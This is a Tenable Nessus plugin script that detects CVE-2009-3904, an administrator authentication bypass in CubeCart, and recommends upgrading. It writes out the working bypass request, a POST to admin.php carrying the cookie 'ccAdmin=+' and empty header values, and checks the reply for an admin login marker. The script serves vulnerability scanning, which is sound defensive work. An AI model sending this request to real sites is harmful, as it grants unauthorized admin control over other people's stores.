#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(42353);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2009-3904");
  script_bugtraq_id(36882);
  script_xref(name:"OSVDB", value:"59696");

  script_name(english:"CubeCart Admin Authentication Bypass");
  script_summary(english:"Attempts to bypass admin authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "A web application running on the remote host has an authentication\n",
      "bypass vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description",
    value:string(
      "The version of CubeCart running on the remote host has an\n",
      "authentication bypass vulnerability.  Sending a specially crafted\n",
      "POST request for 'admin.php' bypasses authentication for the\n",
      "administrative user.  A remote attacker could exploit this to perform\n",
      "administrative actions such as installing malicious packages or\n",
      "dumping the CubeCart database."
    )
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?aa92190c"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-10/0303.html"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://forums.cubecart.com/index.php?showtopic=39748"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to CubeCart 4.3.5 or later."
  );
  script_set_attribute(
    attribute:"cvss_vector",
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date",
    value:"2009/10/29"
  );
  script_set_attribute(
    attribute:"patch_publication_date",
    value:"2009/10/26"
  );
  script_set_attribute(
    attribute:"plugin_publication_date",
    value:"2009/11/03"
  );
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
install = get_install_from_kb(appname:'cubecart', port:port);
if (isnull(install)) exit(1, "CubeCart wasn't detected on port " + port);

headers = make_array(
  'User-Agent', '',
  'X_CLUSTER_CLIENT_IP', '',
  'Cookie', 'ccAdmin=+'
);
url = string(install['dir'], '/admin.php');
req = http_mk_post_req(
  port:port,
  item:url,
  add_headers:headers
);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

if ('<span class="txtLogin">Logged in as: <strong>' >< res[2])
{
  if (report_verbosity > 0)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report = string(
      "\n",
      "Nessus bypassed authentication by issuing the following request :\n",
      "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
      req_str, "\n",
      crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(0, "The CubeCart install at "+build_url(port:port, qs:install['dir']+"/")+" is not affected.");
